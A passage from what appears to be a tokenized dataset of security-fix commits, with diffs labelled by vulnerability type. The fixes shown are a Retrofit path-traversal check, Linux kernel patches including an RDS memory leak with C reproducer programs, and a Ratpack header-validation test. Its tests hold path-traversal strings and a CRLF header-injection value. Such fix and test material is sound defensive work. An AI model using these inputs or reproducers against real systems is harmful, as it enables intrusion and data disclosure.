".", "This", "also", "*", "matches", "dots", "in", "their", "percent", "-", "encoded", "form", ",", "{", "@", "code", "%", "2E", "}", ".", "*", "*", "<", "p", ">", "It", "is", "okay", "to", "have", "these", "strings", "within", "a", "larger", "path", "segment", "(", "like", "{", "@", "code", "a", ".", ".", "z", "}", "or", "{", "@", "code", "*", "index", ".", "html", "}", ")", "but", "when", "alone", "they", "have", "a", "special", "meaning", ".", "A", "single", "dot", "resolves", "to", "no", "path", "*", "segment", "so", "{", "@", "code", "/", "one", "/", "./", "three", "/", "}", "becomes", "{", "@", "code", "/", "one", "/", "three", "/", "}.", "A", "double", "-", "dot", "pops", "the", "preceding", "*", "directory", ",", "so", "{", "@", "code", "/", "one", "/", "..", "/", "three", "/", "}", "becomes", "{", "@", "code", "/", "three", "/", "}.", "*", "*", "<", "p", ">", "We", "forbid", "these", "in", "Retrofit", "paths", "because", "they", "'", "re", "likely", "to", "have", "the", "unintended", "effect", ".", "*", "For", "example", ",", "passing", "{", "@", "code", ".", ".}", "to", "{", "@", "code", "DELETE", "/", "account", "/", "book", "/", "{", "isbn", "}", "/}", "yields", "{", "@", "code", "DELETE", "*", "/", "account", "/", "}.", "*", "/", "private", "static", "final", "Pattern", "PATH_TRAVERSAL", "=", "Pattern", ".", "compile", "(", "\"(", ".*", "/)", "?(", "\\\\", ".|", "%", "2e", "|", "%", "2E", ")", "{", "1", ",", "2", "}", "(/", ".*", ")?", "\")", ";", "private", "final", "String", "method", ";", "private", "final", "HttpUrl", "baseUrl", ";", "@", "@", "-", "91", ",", "7", "+", "107", ",", "13", "@", "@", "void", "addPathParam", "(", "String", "name", ",", "String", "value", ",", "boolean", "encoded", ")", "{", "/", "/", "The", "relative", "URL", "is", "cleared", "when", "the", "first", "query", "parameter", "is", "set", ".", "throw", "new", "AssertionError", "(", ");", "}", "relativeUrl", "=", "relativeUrl", ".", "replace", "(", "\"{", "\"", "+", "name", "+", "\"", "}\"", ",", "canonicalizeForPath", "(", "value", ",", "encoded", ")", ");", "String", "replacement", "=", "canonicalizeForPath", "(", "value", ",", "encoded", ")", ";", "String", "newRelativeUrl", "=", "relativeUrl", ".", "replace", "(", "\"{", "\"", "+", "name", "+", "\"", "}\"", ",", "replacement", ")", ";", "if", "(", "PATH_TRAVERSAL", ".", "matcher", "(", "newRelativeUrl", ")", ".", "matches", "(", "))", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "@", "Path", "parameters", "shouldn", "'", "t", "perform", "path", "traversal", "(", "'.", "'", "or", "'", "..", "')", ":", "\"", "+", "value", ")", ";", "}", "relativeUrl", "=", "newRelativeUrl", ";", "}", "private", "static", "String", "canonicalizeForPath", "(", "String", "input", ",", "boolean", "alreadyEncoded", ")", "{", "@", "@", "-", "878", ",", "6", "+", "878", ",", "88", "@", "@", "assertThat", "(", "request", ".", "body", "(", "))", ".", "isNull", "(", ");", "}", "@", "Test", "public", "void", "pathParametersAndPathTraversal", "(", ")", "{", "class", "Example", "{", "@", "GET", "(", "\"/", "foo", "/", "bar", "/", "{", "ping", "}", "/\"", ")", "/", "/", "Call", "<", "ResponseBody", ">", "method", "(", "@", "Path", "(", "value", "=", "\"", "ping", "\"", ")", "String", "ping", ")", "{", "return", "null", ";", "}", "}", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", ".\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "..", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "./", "a", "\"", ").", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", ".%", "2Fa", "/", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "a", "/", ".\"", ").", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "a", "%", "2F", ".", "/\"", ");", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "a", "/", "..", "\")", ".", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "a", "%", "2F", ".", "./", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "..", "/", "a", "\"", ").", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "..", "%", "2Fa", "/", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "..", "\\\\", "..", "\")", ".", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "..", "%", "5C", ".", "./", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "%", "2E", "\"", ").", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "%", "252E", "/", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "%", "2E", "%", "2E", "\"", ").", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "%", "252E", "%", "252E", "/", "\")", ";", "}", "@", "Test", "public", "void", "encodedPathParametersAndPathTraversal", "(", ")", "{", "class", "Example", "{", "@", "GET", "(", "\"/", "foo", "/", "bar", "/", "{", "ping", "}", "/\"", ")", "/", "/", "Call", "<", "ResponseBody", ">", "method", "(", "@", "Path", "(", "value", "=", "\"", "ping", "\"", ",", "encoded", "=", "true", ")", "String", "ping", ")", "{", "return", "null", ";", "}", "}", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", ".\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "%", "2E", "\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "%", "2e", "\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "..", "\")", ";", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "%", "2E", ".", "\")", ";", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "%", "2e", ".", "\")", ";", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", ".%", "2E", "\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", ".%", "2e", "\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "%", "2E", "%", "2e", "\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "%", "2e", "%", "2E", "\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "./", "a", "\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "a", "/", ".\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "..", "/", "a", "\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "a", "/", "..", "\")", ";", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "a", "/", "..", "/", "b", "\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "a", "/", "%", "2e", "%", "2E", "/", "b", "\"", ");", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "..", ".\"", ").", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "..", "./", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "a", ".", ".", "b", "\"", ").", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "a", ".", ".", "b", "/", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "a", ".", ".\"", ").", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "a", ".", "./", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "a", ".", ".", "b", "\"", ").", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "a", ".", ".", "b", "/", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "..", "b", "\"", ").", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "..", "b", "/", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "..", "\\\\", "..", "\")", ".", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", "/", "bar", "/", "..", "%", "5C", ".", "./", "\")", ";", "}", "@", "Test", "public", "void", "dotDotsOkayWhenNotFullPathSegment", "(", ")", "{", "class", "Example", "{", "@", "GET", "(", "\"/", "foo", "{", "ping", "}", "bar", "/", "\")", "/", "/", "Call", "<", "ResponseBody", ">", "method", "(", "@", "Path", "(", "value", "=", "\"", "ping", "\"", ",", "encoded", "=", "true", ")", "String", "ping", ")", "{", "return", "null", ";", "}", "}", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "/.", "/\"", ");", "assertMalformedRequest", "(", "Example", ".", "class", ",", "\"", "/.", "./", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", ".\"", ").", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", ".", "bar", "/", "\")", ";", "assertThat", "(", "buildRequest", "(", "Example", ".", "class", ",", "\"", "..", "\")", ".", "url", "(", ").", "encodedPath", "(", "))", ".", "isEqualTo", "(", "\"/", "foo", ".", ".", "bar", "/", "\")", ";", "}", "@", "Test", "public", "void", "pathParamRequired", "(", ")", "{", "class", "Example", "{", "@", "GET", "(", "\"/", "foo", "/", "bar", "/", "{", "ping", "}", "/\"", ")", "/", "/", "@", "@", "-", "2783", ",", "4", "+", "2865", ",", "12", "@", "@", "private", "static", "void", "assertBody", "(", "RequestBody", "body", ",", "String", "expected", ")", "{", "return", "buildRequest", "(", "cls", ",", "retrofitBuilder", ",", "args", ")", ";", "}", "static", "void", "assertMalformedRequest", "(", "Class", "<", "?>", "cls", ",", "Object", ".", "..", "args", ")", "{", "try", "{", "Request", "request", "=", "buildRequest", "(", "cls", ",", "args", ")", ";", "fail", "(", "\"", "expected", "a", "malformed", "request", "but", "was", "\"", "+", "request", ")", ";", "}", "catch", "(", "IllegalArgumentException", "expected", ")", "{", "}", "}", "}"], "docstring_tokens": ["directory", "traversal"]}
{"contents": ["ipv6:", "Fix", "OOPS", "in", "ip6_dst_lookup_tail().", "This", "fixes", "kernel", "bugzilla", "11469:", "\"TUN", "with", "1024", "neighbours:", "ip6_dst_lookup_tail", "NULL", "crash\"", "dst->neighbour", "is", "not", "necessarily", "hooked", "up", "at", "this", "point", "in", "the", "processing", "path,", "so", "blindly", "dereferencing", "it", "is", "the", "wrong", "thing", "to", "do.", "This", "NULL", "check", "exists", "in", "other", "similar", "paths", "and", "this", "case", "was", "just", "an", "oversight.", "Also", "fix", "the", "completely", "wrong", "and", "confusing", "indentation", "here", "while", "we're", "at", "it.", "Based", "upon", "a", "patch", "by", "Evgeniy", "Polyakov.", "Signed-off-by:", "Neil", "Horman", "<nhorman@tuxdriver.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "943", ",", "39", "+", "943", ",", "39", "@", "@", "static", "int", "ip6_dst_lookup_tail", "(", "struct", "sock", "*", "sk", ",", "}", "#", "ifdef", "CONFIG_IPV6_OPTIMISTIC_DAD", "/", "*", "*", "Here", "if", "the", "dst", "entry", "we", "'", "ve", "looked", "up", "*", "has", "a", "neighbour", "entry", "that", "is", "in", "the", "INCOMPLETE", "*", "state", "and", "the", "src", "address", "from", "the", "flow", "is", "*", "marked", "as", "OPTIMISTIC", ",", "we", "release", "the", "found", "*", "dst", "entry", "and", "replace", "it", "instead", "with", "the", "*", "dst", "entry", "of", "the", "nexthop", "router", "*", "/", "if", "(", "!(", "(*", "dst", ")", "->", "neighbour", "-", ">", "nud_state", "&", "NUD_VALID", ")", ")", "{", "struct", "inet6_ifaddr", "*", "ifp", ";", "struct", "flowi", "fl_gw", ";", "int", "redirect", ";", "ifp", "=", "ipv6_get_ifaddr", "(", "net", ",", "&", "fl", "-", ">", "fl6_src", ",", "(", "*", "dst", ")", "->", "dev", ",", "1", ")", ";", "redirect", "=", "(", "ifp", "&", "&", "ifp", "-", ">", "flags", "&", "IFA_F_OPTIMISTIC", ")", ";", "if", "(", "ifp", ")", "in6_ifa_put", "(", "ifp", ")", ";", "if", "(", "redirect", ")", "{", "/", "*", "*", "We", "need", "to", "get", "the", "dst", "entry", "for", "the", "*", "default", "router", "instead", "*", "/", "dst_release", "(", "*", "dst", ")", ";", "memcpy", "(", "&", "fl_gw", ",", "fl", ",", "sizeof", "(", "struct", "flowi", ")", ");", "memset", "(", "&", "fl_gw", ".", "fl6_dst", ",", "0", ",", "sizeof", "(", "struct", "in6_addr", ")", ");", "*", "dst", "=", "ip6_route_output", "(", "net", ",", "sk", ",", "&", "fl_gw", ")", ";", "if", "(", "(", "err", "=", "(", "*", "dst", ")", "->", "error", ")", ")", "goto", "out_err_release", ";", "}", "/", "*", "*", "Here", "if", "the", "dst", "entry", "we", "'", "ve", "looked", "up", "*", "has", "a", "neighbour", "entry", "that", "is", "in", "the", "INCOMPLETE", "*", "state", "and", "the", "src", "address", "from", "the", "flow", "is", "*", "marked", "as", "OPTIMISTIC", ",", "we", "release", "the", "found", "*", "dst", "entry", "and", "replace", "it", "instead", "with", "the", "*", "dst", "entry", "of", "the", "nexthop", "router", "*", "/", "if", "(", "(*", "dst", ")", "->", "neighbour", "&", "&", "!", "((", "*", "dst", ")", "->", "neighbour", "-", ">", "nud_state", "&", "NUD_VALID", ")", ")", "{", "struct", "inet6_ifaddr", "*", "ifp", ";", "struct", "flowi", "fl_gw", ";", "int", "redirect", ";", "ifp", "=", "ipv6_get_ifaddr", "(", "net", ",", "&", "fl", "-", ">", "fl6_src", ",", "(", "*", "dst", ")", "->", "dev", ",", "1", ")", ";", "redirect", "=", "(", "ifp", "&", "&", "ifp", "-", ">", "flags", "&", "IFA_F_OPTIMISTIC", ")", ";", "if", "(", "ifp", ")", "in6_ifa_put", "(", "ifp", ")", ";", "if", "(", "redirect", ")", "{", "/", "*", "*", "We", "need", "to", "get", "the", "dst", "entry", "for", "the", "*", "default", "router", "instead", "*", "/", "dst_release", "(", "*", "dst", ")", ";", "memcpy", "(", "&", "fl_gw", ",", "fl", ",", "sizeof", "(", "struct", "flowi", ")", ");", "memset", "(", "&", "fl_gw", ".", "fl6_dst", ",", "0", ",", "sizeof", "(", "struct", "in6_addr", ")", ");", "*", "dst", "=", "ip6_route_output", "(", "net", ",", "sk", ",", "&", "fl_gw", ")", ";", "if", "(", "(", "err", "=", "(", "*", "dst", ")", "->", "error", ")", ")", "goto", "out_err_release", ";", "}", "}", "#", "endif", "return", "0", ";"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["[PATCH]", "fix", "do_coredump()", "vs", "SIGSTOP", "race", "Let's", "suppose", "we", "have", "2", "threads", "in", "thread", "group:", "A", "-", "does", "coredump", "B", "-", "has", "pending", "SIGSTOP", "thread", "A", "thread", "B", "do_coredump:", "get_signal_to_deliver:", "lock(->sighand)", "->signal->flags", "=", "SIGNAL_GROUP_EXIT", "unlock(->sighand)", "lock(->sighand)", "signr", "=", "dequeue_signal()", "->signal->flags", "|=", "SIGNAL_STOP_DEQUEUED", "return", "SIGSTOP;", "do_signal_stop:", "unlock(->sighand)", "coredump_wait:", "zap_threads:", "lock(tasklist_lock)", "send", "SIGKILL", "to", "B", "//", "signal_wake_up()", "does", "nothing", "unlock(tasklist_lock)", "lock(tasklist_lock)", "lock(->sighand)", "re-check", "sig->flags", "&", "SIGNAL_STOP_DEQUEUED,", "yes", "set_current_state(TASK_STOPPED);", "finish_stop:", "schedule();", "//", "->state", "==", "TASK_STOPPED", "wait_for_completion(&startup_done)", "//", "waits", "for", "complete()", "from", "B,", "//", "->state", "==", "TASK_UNINTERRUPTIBLE", "We", "can't", "wake", "up", "'B'", "in", "any", "way:", "SIGCONT", "will", "be", "ignored", "because", "handle_stop_signal()", "sees", "->signal->flags", "&", "SIGNAL_GROUP_EXIT.", "sys_kill(SIGKILL)->__group_complete_signal()", "will", "choose", "uninterruptible", "'A',", "so", "it", "can't", "help.", "sys_tkill(B,", "SIGKILL)", "will", "be", "ignored", "by", "specific_send_sig_info()", "because", "B", "already", "has", "pending", "SIGKILL.", "This", "scenario", "is", "not", "possbile", "if", "'A'", "does", "do_group_exit(),", "because", "it", "sets", "sig->flags", "=", "SIGNAL_GROUP_EXIT", "and", "delivers", "SIGKILL", "to", "subthreads", "atomically,", "holding", "both", "tasklist_lock", "and", "sighand->lock.", "That", "means", "that", "do_signal_stop()", "will", "notice", "!SIGNAL_STOP_DEQUEUED", "after", "re-locking", "->sighand.", "And", "it", "is", "not", "possible", "to", "any", "other", "thread", "to", "re-add", "SIGNAL_STOP_DEQUEUED", "later,", "because", "dequeue_signal()", "can", "only", "return", "SIGKILL.", "I", "think", "it", "is", "better", "to", "change", "do_coredump()", "to", "do", "sigaddset(SIGKILL)", "and", "signal_wake_up()", "under", "sighand->lock,", "but", "this", "patch", "is", "much", "simpler.", "Signed-off-by:", "Oleg", "Nesterov", "<oleg@tv-sign.ru>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@osdl.org>"], "code_tokens": ["@", "@", "-", "578", ",", "7", "+", "578", ",", "8", "@", "@", "int", "dequeue_signal", "(", "struct", "task_struct", "*", "tsk", ",", "sigset_t", "*", "mask", ",", "siginfo_t", "*", "info", ")", "*", "is", "to", "alert", "stop", "-", "signal", "processing", "code", "when", "another", "*", "processor", "has", "come", "along", "and", "cleared", "the", "flag", ".", "*", "/", "tsk", "-", ">", "signal", "-", ">", "flags", "|", "=", "SIGNAL_STOP_DEQUEUED", ";", "if", "(", "!(", "tsk", "-", ">", "signal", "-", ">", "flags", "&", "SIGNAL_GROUP_EXIT", ")", ")", "tsk", "-", ">", "signal", "-", ">", "flags", "|", "=", "SIGNAL_STOP_DEQUEUED", ";", "}", "if", "(", "signr", "&", "&", "(", "(", "info", "-", ">", "si_code", "&", "__SI_MASK", ")", "=", "=", "__SI_TIMER", ")", "&", "&"], "docstring_tokens": ["race", "condition"]}
{"contents": ["rds:", "set", "correct", "msg_namelen", "Jay", "Fenlason", "(fenlason@redhat.com)", "found", "a", "bug,", "that", "recvfrom()", "on", "an", "RDS", "socket", "can", "return", "the", "contents", "of", "random", "kernel", "memory", "to", "userspace", "if", "it", "was", "called", "with", "a", "address", "length", "larger", "than", "sizeof(struct", "sockaddr_in).", "rds_recvmsg()", "also", "fails", "to", "set", "the", "addr_len", "paramater", "properly", "before", "returning,", "but", "that's", "just", "a", "bug.", "There", "are", "also", "a", "number", "of", "cases", "wher", "recvfrom()", "can", "return", "an", "entirely", "bogus", "address.", "Anything", "in", "rds_recvmsg()", "that", "returns", "a", "non-negative", "value", "but", "does", "not", "go", "through", "the", "\"sin", "=", "(struct", "sockaddr_in", "*)msg->msg_name;\"", "code", "path", "at", "the", "end", "of", "the", "while(1)", "loop", "will", "return", "up", "to", "128", "bytes", "of", "kernel", "memory", "to", "userspace.", "And", "I", "write", "two", "test", "programs", "to", "reproduce", "this", "bug,", "you", "will", "see", "that", "in", "rds_server,", "fromAddr", "will", "be", "overwritten", "and", "the", "following", "sock_fd", "will", "be", "destroyed.", "Yes,", "it", "is", "the", "programmer's", "fault", "to", "set", "msg_namelen", "incorrectly,", "but", "it", "is", "better", "to", "make", "the", "kernel", "copy", "the", "real", "length", "of", "address", "to", "user", "space", "in", "such", "case.", "How", "to", "run", "the", "test", "programs", "?", "I", "test", "them", "on", "32bit", "x86", "system,", "3.5.0-rc7.", "1", "compile", "gcc", "-o", "rds_client", "rds_client.c", "gcc", "-o", "rds_server", "rds_server.c", "2", "run", "./rds_server", "on", "one", "console", "3", "run", "./rds_client", "on", "another", "console", "4", "you", "will", "see", "something", "like:", "server", "is", "waiting", "to", "receive", "data...", "old", "socket", "fd=3", "server", "received", "data", "from", "client:data", "from", "client", "msg.msg_namelen=32", "new", "socket", "fd=-1067277685", "sendmsg()", ":", "Bad", "file", "descriptor", "/*****************", "rds_client.c", "********************/", "int", "main(void)", "{", "int", "sock_fd;", "struct", "sockaddr_in", "serverAddr;", "struct", "sockaddr_in", "toAddr;", "char", "recvBuffer[128]", "=", "\"data", "from", "client\";", "struct", "msghdr", "msg;", "struct", "iovec", "iov;", "sock_fd", "=", "socket(AF_RDS,", "SOCK_SEQPACKET,", "0);", "if", "(sock_fd", "<", "0)", "{", "perror(\"create", "socket", "error\\n\");", "exit(1);", "}", "memset(&serverAddr,", "0,", "sizeof(serverAddr));", "serverAddr.sin_family", "=", "AF_INET;", "serverAddr.sin_addr.s_addr", "=", "inet_addr(\"127.0.0.1\");", "serverAddr.sin_port", "=", "htons(4001);", "if", "(bind(sock_fd,", "(struct", "sockaddr*)&serverAddr,", "sizeof(serverAddr))", "<", "0)", "{", "perror(\"bind()", "error\\n\");", "close(sock_fd);", "exit(1);", "}", "memset(&toAddr,", "0,", "sizeof(toAddr));", "toAddr.sin_family", "=", "AF_INET;", "toAddr.sin_addr.s_addr", "=", "inet_addr(\"127.0.0.1\");", "toAddr.sin_port", "=", "htons(4000);", "msg.msg_name", "=", "&toAddr;", "msg.msg_namelen", "=", "sizeof(toAddr);", "msg.msg_iov", "=", "&iov;", "msg.msg_iovlen", "=", "1;", "msg.msg_iov->iov_base", "=", "recvBuffer;", "msg.msg_iov->iov_len", "=", "strlen(recvBuffer)", "+", "1;", "msg.msg_control", "=", "0;", "msg.msg_controllen", "=", "0;", "msg.msg_flags", "=", "0;", "if", "(sendmsg(sock_fd,", "&msg,", "0)", "==", "-1)", "{", "perror(\"sendto()", "error\\n\");", "close(sock_fd);", "exit(1);", "}", "printf(\"client", "send", "data:%s\\n\",", "recvBuffer);", "memset(recvBuffer,", "'\\0',", "128);", "msg.msg_name", "=", "&toAddr;", "msg.msg_namelen", "=", "sizeof(toAddr);", "msg.msg_iov", "=", "&iov;", "msg.msg_iovlen", "=", "1;", "msg.msg_iov->iov_base", "=", "recvBuffer;", "msg.msg_iov->iov_len", "=", "128;", "msg.msg_control", "=", "0;", "msg.msg_controllen", "=", "0;", "msg.msg_flags", "=", "0;", "if", "(recvmsg(sock_fd,", "&msg,", "0)", "==", "-1)", "{", "perror(\"recvmsg()", "error\\n\");", "close(sock_fd);", "exit(1);", "}", "printf(\"receive", "data", "from", "server:%s\\n\",", "recvBuffer);", "close(sock_fd);", "return", "0;", "}", "/*****************", "rds_server.c", "********************/", "int", "main(void)", "{", "struct", "sockaddr_in", "fromAddr;", "int", "sock_fd;", "struct", "sockaddr_in", "serverAddr;", "unsigned", "int", "addrLen;", "char", "recvBuffer[128];", "struct", "msghdr", "msg;", "struct", "iovec", "iov;", "sock_fd", "=", "socket(AF_RDS,", "SOCK_SEQPACKET,", "0);", "if(sock_fd", "<", "0)", "{", "perror(\"create", "socket", "error\\n\");", "exit(0);", "}", "memset(&serverAddr,", "0,", "sizeof(serverAddr));", "serverAddr.sin_family", "=", "AF_INET;", "serverAddr.sin_addr.s_addr", "=", "inet_addr(\"127.0.0.1\");", "serverAddr.sin_port", "=", "htons(4000);", "if", "(bind(sock_fd,", "(struct", "sockaddr*)&serverAddr,", "sizeof(serverAddr))", "<", "0)", "{", "perror(\"bind", "error\\n\");", "close(sock_fd);", "exit(1);", "}", "printf(\"server", "is", "waiting", "to", "receive", "data...\\n\");", "msg.msg_name", "=", "&fromAddr;", "/*", "*", "I", "add", "16", "to", "sizeof(fromAddr),", "ie", "32,", "*", "and", "pay", "attention", "to", "the", "definition", "of", "fromAddr,", "*", "recvmsg()", "will", "overwrite", "sock_fd,", "*", "since", "kernel", "will", "copy", "32", "bytes", "to", "userspace.", "*", "*", "If", "you", "just", "use", "sizeof(fromAddr),", "it", "works", "fine.", "*", "*/", "msg.msg_namelen", "=", "sizeof(fromAddr)", "+", "16;", "/*", "msg.msg_namelen", "=", "sizeof(fromAddr);", "*/", "msg.msg_iov", "=", "&iov;", "msg.msg_iovlen", "=", "1;", "msg.msg_iov->iov_base", "=", "recvBuffer;", "msg.msg_iov->iov_len", "=", "128;", "msg.msg_control", "=", "0;", "msg.msg_controllen", "=", "0;", "msg.msg_flags", "=", "0;", "while", "(1)", "{", "printf(\"old", "socket", "fd=%d\\n\",", "sock_fd);", "if", "(recvmsg(sock_fd,", "&msg,", "0)", "==", "-1)", "{", "perror(\"recvmsg()", "error\\n\");", "close(sock_fd);", "exit(1);", "}", "printf(\"server", "received", "data", "from", "client:%s\\n\",", "recvBuffer);", "printf(\"msg.msg_namelen=%d\\n\",", "msg.msg_namelen);", "printf(\"new", "socket", "fd=%d\\n\",", "sock_fd);", "strcat(recvBuffer,", "\"--data", "from", "server\");", "if", "(sendmsg(sock_fd,", "&msg,", "0)", "==", "-1)", "{", "perror(\"sendmsg()\\n\");", "close(sock_fd);", "exit(1);", "}", "}", "close(sock_fd);", "return", "0;", "}", "Signed-off-by:", "Weiping", "Pan", "<wpan@redhat.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "410", ",", "6", "+", "410", ",", "8", "@", "@", "int", "rds_recvmsg", "(", "struct", "kiocb", "*", "iocb", ",", "struct", "socket", "*", "sock", ",", "struct", "msghdr", "*", "msg", ",", "rdsdebug", "(", "\"", "size", "%", "zu", "flags", "0x", "%", "x", "timeo", "%", "ld", "\\", "n", "\"", ",", "size", ",", "msg_flags", ",", "timeo", ")", ";", "msg", "-", ">", "msg_namelen", "=", "0", ";", "if", "(", "msg_flags", "&", "MSG_OOB", ")", "goto", "out", ";", "@", "@", "-", "485", ",", "6", "+", "487", ",", "7", "@", "@", "int", "rds_recvmsg", "(", "struct", "kiocb", "*", "iocb", ",", "struct", "socket", "*", "sock", ",", "struct", "msghdr", "*", "msg", ",", "sin", "-", ">", "sin_port", "=", "inc", "-", ">", "i_hdr", ".", "h_sport", ";", "sin", "-", ">", "sin_addr", ".", "s_addr", "=", "inc", "-", ">", "i_saddr", ";", "memset", "(", "sin", "-", ">", "sin_zero", ",", "0", ",", "sizeof", "(", "sin", "-", ">", "sin_zero", ")", ");", "msg", "-", ">", "msg_namelen", "=", "sizeof", "(", "*", "sin", ")", ";", "}", "break", ";", "}"], "docstring_tokens": ["local", "information", "disclosure"]}
{"contents": ["Add", "test", "for", "response", "header", "validation"], "code_tokens": ["@", "@", "-", "0", ",", "0", "+", "1", ",", "42", "@", "@", "/", "*", "*", "Copyright", "2019", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "ratpack", ".", "http", "import", "ratpack", ".", "test", ".", "internal", ".", "RatpackGroovyDslSpec", "class", "ResponseHeaderValidationSpec", "extends", "RatpackGroovyDslSpec", "{", "def", "\"", "invalid", "header", "values", "yield", "exception", "\"", "()", "{", "when", ":", "handlers", "{", "all", "{", "try", "{", "header", "(", "\"", "Test", "\"", ",", "\"", "value", "\\", "r", "\\", "nAnotherHeader", ":", "another", "value", "\"", ")", "render", "\"", "ok", "\"", "}", "catch", "(", "e", ")", "{", "render", "e", ".", "toString", "(", ")", "}", "}", "}", "then", ":", "def", "response", "=", "get", "(", ")", "response", ".", "headers", ".", "names", "=", "=", "[", "'", "content", "-", "type", "'", ",", "'", "content", "-", "length", "'", "].", "toSet", "(", ")", "response", ".", "body", ".", "text", "=", "=", "\"", "java", ".", "lang", ".", "IllegalArgumentException", ":", "only", "'", "'", "and", "'", "\\\\", "t", "'", "are", "allowed", "after", "'", "\\\\", "n", "'", ":", "value", "\\", "r", "\\", "nAnotherHeader", ":", "another", "value", "\"", "}", "}"], "docstring_tokens": ["http", "header", "injection"]}
{"contents": ["[SECURITY-372]", "Do", "not", "send", "mail", "to", "unrecognized", "or", "unauthorized", "users."], "code_tokens": ["@", "@", "-", "54", ",", "7", "+", "54", ",", "7", "@", "@", "public", "void", "send", "(", "final", "String", "format", ",", "final", "Object", ".", "..", "args", ")", "{", "final", "Result", "runResult", "=", "run", ".", "getResult", "(", ");", "if", "(", "run", "instanceof", "AbstractBuild", ")", "{", "Set", "<", "User", ">", "users", "=", "(", "(", "AbstractBuild", "<", "?,", "?>", ")", "run", ")", ".", "getCulprits", "(", ");", "RecipientProviderUtilities", ".", "addUsers", "(", "users", ",", "context", ".", "getListener", "(", "),", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "RecipientProviderUtilities", ".", "addUsers", "(", "users", ",", "context", ",", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "}", "else", "if", "(", "runResult", "!", "=", "null", ")", "{", "List", "<", "Run", "<", "?,", "?", ">>", "builds", "=", 